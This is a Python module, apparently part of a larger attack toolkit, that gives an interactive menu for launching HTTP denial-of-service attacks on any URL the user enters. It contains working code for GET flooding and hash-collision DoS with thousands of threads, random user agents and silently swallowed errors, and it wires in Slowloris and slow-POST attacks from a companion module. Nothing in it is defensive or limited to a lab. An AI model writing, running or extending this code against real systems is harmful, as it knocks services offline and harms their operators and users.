import sys, time, random, requests

from ..thread import ThreadWorker, ThreadCounter2
from ..utils import get_random_string
from .slowdos import SlowHTTPDos
from .utils import get_random_user_agent


class NF_HTTPTool:
    def __init__(self): 
        pass

    #========================= MENUS =========================#

    def menu(self) -> None:
        def print_menu():
            print(f'''
 +-------------------------------------------------------------------+
 |                       < HTTP Attack Menu >                        |
 +-------------------------------------------------------------------+
 |                                                                   |
 |   (1) HTTP GET Flooding                                           |
 |                                                                   |
 |   (2) Slow HTTP Header DoS (aka. Slowloris)                       |
 |   (3) Slow HTTP POST DoS                                          |
 |                                                                   |
 |   (4) Hash DoS                                                    |
 |                                                                   |
 |   (0) Back to Main Menu                                           |
 |                                                                   |
 +-------------------------------------------------------------------+\n''')

        print_menu()
        while True:
            try:
                i = input('[?] Enter menu number : ')
            except KeyboardInterrupt:
                print()
                break
            print()

            if i == '0':
                break

            url = input('[?] Enter URL to attack : ').strip()
            print()
            if url == '':
                print('[-] No URL was entered.')
                continue

            thread_count = input('[?] Enter number of threads to use (6000) : ').strip() or '6000'
            if not thread_count.isdigit():
                print('\n[-] Please enter a number.\n')
                continue
            thread_count = int(thread_count)
            if thread_count <= 0: thread_count = 1
        
            if i == '1':
                self.get_flooding(url, thread_count)
                sys.exit() # TODO
            elif i == '2':
                slow = SlowHTTPDos()
                slow.slow_http_header_dos(url, thread_count)
                sys.exit() # TODO
            elif i == '3':
                slow = SlowHTTPDos()
                slow.slow_http_post_dos(url, thread_count)
                sys.exit() # TODO
            elif i == '4':
                self.hash_dos(url, thread_count)
                sys.exit()
            else:
                continue

            try:
                input('[?] Press enter key to back to menu. ')
            except KeyboardInterrupt:
                print()
            print_menu()


    def get_flooding(self, url: str, thread_count: int) -> None:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        def main():
            print('[*] Sending...')
            time.sleep(1)

        def worker(url: str):
            time.sleep(3)
            headers = { 'User-Agent': get_random_user_agent() }
            while True:
                try:
                    requests.get(url, headers=headers)
                    # counter.count('Succ')
                except:
                    pass
                    # counter.count('Error')
                time.sleep(random.random() * 0.1)

        counter = ThreadCounter2(['Succ', 'Error'])
        tw = ThreadWorker(thread_count)
        tw.set_main_thread(main)
        tw.set_worker_thread(worker, (url,))
        print('[*] Start HTTP GET Flooding DoS!\n')
        tw.run()
        print('[+] GET Flooding has been stopped.')


    def hash_dos(self, url: str, thread_count: int) -> None:
        if thread_count >= 1000:
            print('[*] Too many threads. Reduce to 1000.')
            thread_count = 1000

        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        def main():
            print('[*] Sending...')
            time.sleep(1)

        def worker(url: str):
            time.sleep(3)
            headers = {
                'User-Agent': get_random_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            while True:
                try:
                    base = get_random_string(16)
                    body = ''
                    for i in range(10000):
                        body += f'{base}{i}={i}{base}&'
                    body += f'{base}={base}'
                    requests.post(url, headers=headers, data=body, timeout=10)
                except:
                    pass
                time.sleep(random.random() * 2)

        counter = ThreadCounter2(['Succ', 'Error'])
        tw = ThreadWorker(thread_count)
        tw.set_main_thread(main)
        tw.set_worker_thread(worker, (url,))
        print('[*] Start Hash DoS!\n')
        tw.run()
        print('[+] DoS attack has been stopped.')



